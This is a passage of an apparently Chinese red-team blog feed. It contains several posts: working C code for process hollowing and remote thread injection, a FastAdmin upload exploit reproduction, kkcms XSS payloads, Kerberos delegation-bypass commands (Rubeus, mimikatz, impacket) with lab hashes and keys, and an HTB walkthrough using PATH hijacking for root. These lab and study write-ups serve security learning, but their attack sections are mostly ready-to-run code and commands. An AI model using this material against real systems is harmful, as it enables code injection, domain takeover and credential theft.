printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;GetThreadContext Sucess\n&quot;);        DWORD dwImageBase = 0;        DWORD lpNumberOfBytesRead = 0;        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x8), &amp;dwImageBase,  sizeof(DWORD), &amp;lpNumberOfBytesRead)) {               printf(&quot;ReadProcessMemory Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;ReadProcessMemory Sucess\n&quot;);        DWORD NumberOfBytesWritten = 0;        if (!WriteProcessMemory(pi.hProcess, (LPVOID)ctx.Eax, buf, sizeof(buf),  &amp;NumberOfBytesWritten)) {               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;);        }        printf(&quot;WriteProcessMemory Sucess\n&quot;);        if (ResumeThread(pi.hThread) == -1) { //恢复线程执行成功的话函数返回为0               printf(&quot;ResumeThread Error Code:%d\n&quot;,GetLastError());        }        printf(&quot;ResumeThread Sucess\n&quot;);}int main(){        test();        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3n2yF.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/06/c3nhw9.png" alt=""></p><p><strong>x86进程替换</strong><br>1.创建进程CreateProcessA<br>2.获取进程PEB地址GetThreadContext<br>3.读取文件获取文件句柄 CreateFileA #替换掉目标文件的恶意文件<br>4.获取文件大小 GetFileSize<br>5.定义一个恶意文件的大小内存空间<br>6.读取文件内容 ReadFile<br>7.获取恶意文件内容的DOS头 (PIMAGE_DOS_HEADER)pBuf<br>8.获取恶意文件内容的NT头 (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew)<br>9.更改创建进程的基地址允许执行权限((LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase)<br>10.往进程内存写入恶意文件WriteProcessMemory(pi.hProcess,lpAddr,(LPCVOID)pBuf,pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,NULL); //指向要写的数据的指针。<br>11.替换字节<br>12.替换PEB中基地址<br>13.替换入口点</p><p>pDosHeader-&gt;e_lfanew DOS偏移头<br>pNtHeaders-&gt;OptionalHeader.ImageBase 基地址<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage PE大小<br>pNtHeaders-&gt;FileHeader.NumberOfSections 节表大小<br> (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress 节区的RVA地址<br> (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData 在文件中的偏移<br>dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint 程序执行入口RVA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;void test() {        CHAR test[MAX_PATH] = &quot;C:\\Windows\\SysWOW64\\explorer.exe&quot;;        CHAR test2[MAX_PATH] = &quot;C:\\windows\\SysWOW64\\calc.exe&quot;;        STARTUPINFOA si;        PROCESS_INFORMATION pi;        ZeroMemory(&amp;si, sizeof(si));        ZeroMemory(&amp;pi, sizeof(pi));        if (!CreateProcessA(test, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi)) {               printf(&quot;CreateProcess Error:%d\n&quot;,GetLastError());               return;        }        printf(&quot;CreateProcess Sucess\n&quot;);        CONTEXT ctx;        ctx.ContextFlags = CONTEXT_ALL;        if (!GetThreadContext(pi.hThread, &amp;ctx)) {               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());               return;        }        printf(&quot;GetThreadContext Sucess\n&quot;);        HANDLE hFile = CreateFileA(test2, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE  | FILE_SHARE_DELETE,               NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);        if (hFile == INVALID_HANDLE_VALUE)        {               printf(&quot;Open EXE File Filed&quot;);               printf(&quot;%d&quot;, GetLastError());               return;        }        DWORD dwSize = GetFileSize(hFile, NULL);        LPBYTE pAllocPE = NULL;        PBYTE pBuf = (PBYTE)malloc(dwSize);        DWORD dwBytesRead = 0;        ReadFile(hFile, (LPVOID)pBuf, dwSize, &amp;dwBytesRead, NULL);        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf;        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew);        //2.获取进程上下文        CONTEXT stThreadContext;        stThreadContext.ContextFlags = CONTEXT_FULL;        if (GetThreadContext(pi.hThread, &amp;stThreadContext) == 0)        {               printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());               return;        }        void* lpAddr = VirtualAllocEx(pi.hProcess,  (LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase,               pNtHeaders-&gt;OptionalHeader.SizeOfImage,               MEM_COMMIT | MEM_RESERVE,               PAGE_EXECUTE_READWRITE);//用Imagebase为起始地址避免了重定位。        if (lpAddr == NULL)        {               printf(&quot;VirtualAlloc failed (%d).\n&quot;, GetLastError());               return;        }        BOOL bRet = WriteProcessMemory(pi.hProcess,               lpAddr,               (LPCVOID)pBuf,//指向要写的数据的指针。               pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,               NULL);        if (!bRet)        {               return ;        }        // 替换节        LPVOID lpSectionBaseAddr = (LPVOID)((DWORD)pBuf               + pDosHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS));        PIMAGE_SECTION_HEADER pSectionHeader;        DWORD dwIndex = 0;        for (; dwIndex &lt; pNtHeaders-&gt;FileHeader.NumberOfSections; ++dwIndex)        {               pSectionHeader = (PIMAGE_SECTION_HEADER)lpSectionBaseAddr;               bRet = WriteProcessMemory(pi.hProcess,                       (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress),                       (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData),                       pSectionHeader-&gt;SizeOfRawData,                       NULL);               if (!bRet)               {                       return;               }               lpSectionBaseAddr = (LPVOID)((DWORD)lpSectionBaseAddr +  sizeof(IMAGE_SECTION_HEADER));        }        //6.恢复现场并运行傀儡进程        // 替换PEB中基地址        DWORD dwImageBase = pNtHeaders-&gt;OptionalHeader.ImageBase;        bRet = WriteProcessMemory(pi.hProcess, (LPVOID)(stThreadContext.Ebx + 8),  (LPCVOID)&amp;dwImageBase, sizeof(PVOID), NULL);        if (!bRet)        {               return;        }        // 替换入口点        stThreadContext.Eax = dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;        bRet = SetThreadContext(pi.hThread, &amp;stThreadContext);        if (!bRet)        {               return;        }        ResumeThread(pi.hThread);        printf(&quot;PID: %d&quot;, pi.dwProcessId);        free(pBuf);}int main(){        test();        system(&quot;pause&quot;);        return 0;}</code></pre><p><img src="https://z3.ax1x.com/2021/04/06/c3nXeH.png" alt=""></p><p>x64傀儡进程参考：<a href="https://bbs.pediy.com/thread-253362.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253362.htm</a><br>EXE替换参考：<a href="https://jev0n.com/2020/03/11/65.html" target="_blank" rel="noopener">https://jev0n.com/2020/03/11/65.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;shellcode插入&lt;/strong&gt;&lt;br&gt;x64&lt;br&gt;整体流程：&lt;br&gt;1.创建进程，获取进程句柄 CreateProcessA&lt;br&gt;2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx&lt;br&gt;3.远程写入shellco</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>FastAdmin前台文件上传复现</title>
    <link href="http://422926799.github.io/posts/de1b4dd1.html"/>
    <id>http://422926799.github.io/posts/de1b4dd1.html</id>
    <published>2021-04-03T15:58:51.000Z</published>
    <updated>2021-04-03T16:22:45.434Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>漏洞发生于：2021年/4月1号<br>漏洞点：application\api\controller\Common.php<br>触发漏洞的url：/index/ajax/upload<br>要求：application\extra\upload.php里的chunking为true (分片上传为true)<br><img src="https://z3.ax1x.com/2021/04/04/cuYe9x.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞点分析<br>需要包括以下的post请求参数才行<br>1.chunkid参数<br>2.action参数<br>3.chunkindex参数<br>4.chunkcount参数<br>5.filename参数<br><img src="https://z3.ax1x.com/2021/04/04/cuYG4I.md.png" alt=""></p><p>随后进入if判断，当action参数不为merge或method不为clean的时候。调用chunk函数chunk($chunkid, $chunkindex, $chunkcount);进入分片文件上传<br><img src="https://z3.ax1x.com/2021/04/04/cuYDEj.md.png" alt=""></p><p>跟进chunk函数，<br>1.首先$destDir=RUNTIME_PATH/chunks路径, RUNTIME=ROOT_PATH . ‘runtime’ . DS (DS=根据系统的文件分隔符)<br><img src="https://z3.ax1x.com/2021/04/04/cuYrUs.md.png" alt=""></p><p>2.$fileName=$chunkid-$chunindex.part //$chunkid和$chunindex都可控<br>3.$destDir=$destDir.DS.$fileName //拼接得到最后文件路径<br>4.判断RUNTIME_PATH/chunks路径是否存在，不存在则创建文件夹<br>5.将临时文件移动到RUNTIME_PATH/chunks路径下<br><img src="https://z3.ax1x.com/2021/04/04/cuYhb4.md.png" alt=""></p><p>之后触发merge函数，写shell<br>要求action参数为merge<br><img src="https://z3.ax1x.com/2021/04/04/cutQzV.md.png" alt=""></p><p>首先chunkDir变量来自于下图<br>$chunkDir=RUNTIME_PATH . ‘chunks’<br><img src="https://z3.ax1x.com/2021/04/04/cut3sU.md.png" alt=""></p><p>1.$filePath=RUNTIME_PATH . ‘chunks’.DS.$chunkid //$chunkid参数可控<br>2.根据$chunkcount变量进行循环<br>3.判断$filePath-$i-.part文件是否存在<br>4.如果文件存在，在/runtime/chunks路径下创建以$filepath作为文件名的文件$destFile=@fopen($uploadPath, “wb”)<br>5.锁定文件<br>6.根据$chunkcount参数循环 //$chunkcount参数可控<br>7.$partFile=$filePath-$i-.part<br>8.循环读取$partFile内容，写入文件到$filepath<br>9.读取完文件后，删除分片文件，释放文件锁定，关闭文件句柄<br><img src="https://z3.ax1x.com/2021/04/04/cutDsO.md.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cutrLD.md.png" alt=""></p><p>exp分析:<br><img src="https://z3.ax1x.com/2021/04/04/cut2FA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/04/04/cut4Qf.png" alt=""></p><p>exp地址:<a href="https://github.com/exp1orer/FastAdmin_Upload" target="_blank" rel="noopener">https://github.com/exp1orer/FastAdmin_Upload</a></p><p><img src="https://z3.ax1x.com/2021/04/04/cut5y8.png" alt=""></p><p>至于这里的shell地址为什么是根目录，因为这个exp是这么写的<br><img src="https://z3.ax1x.com/2021/04/04/cutjS0.md.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://zhuanlan.zhihu.com/p/57166400" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57166400</a><br><a href="https://xz.aliyun.com/t/9395" target="_blank" rel="noopener">https://xz.aliyun.com/t/9395</a><br><a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;漏洞发生于：2021年/4月1号&lt;br&gt;漏洞点：application\api\controller\Common.php&lt;br&gt;触发漏洞的</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>kkcms1.371代码审计</title>
    <link href="http://422926799.github.io/posts/de5a64f.html"/>
    <id>http://422926799.github.io/posts/de5a64f.html</id>
    <published>2021-03-30T16:49:39.000Z</published>
    <updated>2021-03-30T17:55:14.844Z</updated>
    
    <content type="html"><![CDATA[<p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p><h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p><ul><li>library.php 处理函数和单双引号转义处理</li><li>inc.php 引用了system目录里的所有文件</li></ul><h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p><p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p><p>可以看到，对所有的请求对单双引号进行了转义</p><pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {    exit(&#39;Request Error!&#39;);}if (!get_magic_quotes_gpc()) {    if (!empty($_GET)) {        $_GET = addslashes_deep($_GET);    }    if (!empty($_POST)) {        $_POST = addslashes_deep($_POST);    }    $_COOKIE = addslashes_deep($_COOKIE);    $_REQUEST = addslashes_deep($_REQUEST);}</code></pre><p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p><p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p><p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p><p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p><p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p><p>貌似payload并不会因为addslashes_deep函数而失效</p><p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p><p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p><p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p><p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p><p>留言板和这个差不多一致，省略</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p><h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p><p>总的来说，这套CMS有点水</p><p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的&lt;br&gt;but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询&lt;/p&gt;
&lt;h2 id=&quot;预处理分析&quot;&gt;&lt;a href=&quot;#预处理分析&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</title>
    <link href="http://422926799.github.io/posts/9cf32cdf.html"/>
    <id>http://422926799.github.io/posts/9cf32cdf.html</id>
    <published>2021-03-19T06:28:37.000Z</published>
    <updated>2021-03-19T06:45:06.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p><h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p><p>域用户:<br>fwwr<br>joke</p><h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p><p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p><p>常规的约束委派利用:</p><pre><code>1. 得到约束委派机器的用户凭证2. 发现委派用户委派的目标机器3. 获取RC4利用</code></pre><p>powerview查看约束委派的机器:</p><pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p><p>Rubeus一条命令实现约束委派：</p><pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p><p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p><pre><code>privilege::debugsekurlsa::&quot;ekeys&quot;</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p><p>获取TGT导入smbexec连接</p><pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardableexport KRB5CCNAME=administrator.ccachesudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p><p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p><h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p><p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p><p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p><pre><code>Import-Module .\powermad.ps1New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p><p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p><p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p><pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dllGet-ADComputer AttackerService #确认机器账户已经被添加Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器</code></pre><p>验证用户是否成功委派到目标机器</p><pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SIDGet-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p><p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p><pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardableexport KRB5CCNAME=administrator.ccachepython3 psexec.py -no-pass -k one2008.YAYI.local</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;该漏洞解决了两个问题&lt;br&gt;1.禁止协议转换/协议过渡&lt;br&gt;2.受保护的用户和敏感用户不能被委派&lt;br&gt;具体设置表现为DC上设置Servi</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>HTB laboratory</title>
    <link href="http://422926799.github.io/posts/2ee11a81.html"/>
    <id>http://422926799.github.io/posts/2ee11a81.html</id>
    <published>2021-03-18T05:29:21.000Z</published>
    <updated>2021-03-18T05:37:22.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规nmap扫描</p><pre><code>nmap -sC -sV 10.10.10.216</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqiSe.png" alt=""></p><p>从扫描结果能看到，有两个域</p><pre><code>laboratory.htbgit.laboratory.htb</code></pre><p>加入/etc/hosts<br><img src="https://s3.ax1x.com/2021/03/18/6gqFQH.png" alt=""></p><p>访问<code>laboratory.htb</code>发现就一个静态，拉倒下面有三个用户名。先记录下来<br><img src="https://s3.ax1x.com/2021/03/18/6gqAOA.md.png" alt=""></p><p>访问<code>git.laboratory.htb</code>是一个gitlab，注册gitlab发现版本<br>（ps:这里注册gitlab用他域做邮箱域：<a href="mailto:`joker@laboratory.htb" target="_blank" rel="noopener">`joker@laboratory.htb</a>`，不然会注册失败）<br><img src="https://s3.ax1x.com/2021/03/18/6gqeTP.png" alt=""></p><p>![](<a href="https://s3.ax1x.com/2021/03/18/6gqnFf.png" target="_blank" rel="noopener">https://s3.ax1x.com/2021/03/18/6gqnFf.png</a></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>搜索gitlab对应的版本发现存在RCE,msf用对应的利用工具<br><img src="https://s3.ax1x.com/2021/03/18/6gqB6J.png" alt=""></p><p>查看刚刚收集到的用户名，发现Dexter是CEO。修改他的密码<br><img src="https://s3.ax1x.com/2021/03/18/6gqDX9.png" alt=""></p><p>登录它的gitlab发现有id_rsa<br><img src="https://s3.ax1x.com/2021/03/18/6gqsmR.png" alt=""></p><p>ssh连接得到user.txt<br><img src="https://s3.ax1x.com/2021/03/18/6gq46H.png" alt=""></p><p><img src="img/user.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>suid查找发现存在个docker-security。strings查看，发现有执行命令chmod。利用劫持提权</p><pre><code>echo &quot;/bin/bash&quot; &gt; /tmp/chmodchmod 777 /tmp/chmodexport PATH=/tmp:$PATH</code></pre><p><img src="https://s3.ax1x.com/2021/03/18/6gqqtf.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;常规nmap扫描&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nmap -sC -sV 10.10.10.216
&lt;/code&gt;&lt;/pre</summary>
      
    
    
    
    
    <category term="htb" scheme="http://422926799.github.io/tags/htb/"/>
    
  </entry>
  
  <entry>
    <title>远程线程注入(系统进程)</title>
    <link href="http://422926799.github.io/posts/b76f927c.html"/>
    <id>http://422926799.github.io/posts/b76f927c.html</id>
    <published>2021-03-14T15:57:27.000Z</published>
    <updated>2021-03-14T16:07:12.399Z</updated>
    
    <content type="html"><![CDATA[<p>最近在看windows黑客编程的pdf，跟着复现一下。看到突破SESSION 0隔离的远程线程注入。发现是直接将dll注入到<br>系统进程，试了一下并不行，抄网上的code发现也不行。发现大部分都是在2008上测的，而且注入的函数也没多大区别。<br>然后联想到是不是权限的问题，试了一下确实是</p><h2 id="用到的API函数"><a href="#用到的API函数" class="headerlink" title="用到的API函数"></a>用到的API函数</h2><p>远程线程注入：</p><ul><li>OpenProcess</li><li>VirtualAllocEx</li><li>WriteProcessMemory</li><li>CreateRemoteThread</li></ul><p>特权开启：</p><ul><li>OpenProcessToken</li><li>LookupPrivilegeValueA</li><li>AdjustTokenPrivileges</li></ul><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>开启SeDebugPrivilege特权</p><pre><code class="C">bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue); //检索本地唯一性标识符的特定系统上用于局部地（LUID）表示指定的权限名称        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL); //设置特权开启/关闭        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == ERROR_SUCCESS) {               printf(&quot;Enable Privilege:SeDebugPrivilege Sucess\n&quot;);        }}</code></pre><p>完整代码</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define errorprint(name){printf(&quot;%s Error Code:%d\n&quot;,name,GetLastError());return 1;}bool EnbalePrivileges() {        HANDLE hToken = NULL;        LUID luidValue = { 0 };        TOKEN_PRIVILEGES tp = { 0 };        DWORD wdret = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES,  &amp;hToken);        if (wdret == NULL) {               errorprint(&quot;OpenProcessToken&quot;);        }        BOOL privilege=LookupPrivilegeValueA(NULL,&quot;SeDebugPrivilege&quot;,&amp;luidValue);        if (privilege == false) {               errorprint(&quot;LookupPrivilegeValueA Privilege:SeDebugPrivilege&quot;);        }        tp.PrivilegeCount = 1;        tp.Privileges[0].Luid = luidValue;        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;        bool bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tp, 0, NULL, NULL);        if (bRet == false) {               errorprint(&quot;Enable Privilege Failure\n&quot;);        }        if (GetLastError() == 